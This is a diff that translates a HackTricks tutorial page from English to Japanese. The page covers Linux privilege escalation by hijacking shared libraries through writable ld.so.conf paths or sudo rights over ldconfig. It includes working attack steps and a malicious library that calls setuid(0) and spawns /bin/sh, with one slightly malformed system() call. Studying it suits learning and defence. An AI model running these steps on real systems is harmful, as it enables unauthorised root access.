@@ -2,82 +2,71 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Prepare the environment
+## 環境の準備
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+次のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
-
 ```c
 #include <stdio.h>
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="libcustom.h"}}
-
 ```c
 #include <stdio.h>
 
 void vuln_func();
 ```
-
 {{#endtab}}
 
 {{#tab name="libcustom.c"}}
-
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **同じフォルダ**にそのファイルを作成します
+2. **ライブラリ**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
+4. **実行可能ファイル**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### Check the environment
+### 環境を確認する
 
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
+_libcustom.so_が_/usr/lib_から**読み込まれている**ことと、バイナリを**実行**できることを確認します。
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
 
 $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-
 ## Exploit
 
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+このシナリオでは、**誰かが_/etc/ld.so.conf/_内に脆弱なエントリを作成した**と仮定します：
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+脆弱なフォルダーは _/home/ubuntu/lib_ です（書き込みアクセスがあります）。\
+**次のコードをそのパス内でダウンロードしてコンパイル**してください：
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -86,27 +75,23 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+今、**誤って設定された**パス内に悪意のあるlibcustomライブラリを**作成したので**、**再起動**を待つか、rootユーザーが**`ldconfig`**を実行するのを待つ必要があります（_このバイナリを**sudo**として実行できる場合、または**suidビット**が設定されている場合は、自分で実行できます_）。
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+これが発生したら、**再確認**してください。`sharevuln`実行可能ファイルが`libcustom.so`ライブラリをどこから読み込んでいるかを確認します：
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+ご覧のとおり、**`/home/ubuntu/lib`から読み込んでおり**、ユーザーがそれを実行するとシェルが実行されます：
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -114,40 +99,35 @@ I'm the bad library
 $ whoami
 ubuntu
 ```
-
 > [!NOTE]
-> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+> この例では特権を昇格させていないことに注意してくださいが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つことで**特権を昇格させることができます。
 
-### Other misconfigurations - Same vuln
+### 他の誤設定 - 同じ脆弱性
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+前の例では、管理者が**`/etc/ld.so.conf.d/`内の設定ファイルに非特権フォルダーを設定した**という誤設定を偽装しました。\
+しかし、同じ脆弱性を引き起こす他の誤設定もあります。もし`/etc/ld.so.conf.d`内のいくつかの**設定ファイル**、`/etc/ld.so.conf.d`フォルダー内、または`/etc/ld.so.conf`ファイル内に**書き込み権限**がある場合、同じ脆弱性を設定して悪用することができます。
 
-## Exploit 2
+## エクスプロイト 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**`ldconfig`に対してsudo権限を持っていると仮定します**。\
+`ldconfig`に**設定ファイルをどこから読み込むかを指示することができます**。これを利用して`ldconfig`に任意のフォルダーを読み込ませることができます。\
+では、"/tmp"を読み込むために必要なファイルとフォルダーを作成しましょう：
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+今、**前のエクスプロイト**で示されたように、**`/tmp`内に悪意のあるライブラリを作成します**。\
+最後に、パスをロードして、バイナリがライブラリをどこからロードしているかを確認しましょう：
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**ご覧のとおり、`ldconfig`に対するsudo権限を持っていると、同じ脆弱性を悪用できます。**
 
 {{#include ../../banners/hacktricks-training.md}}
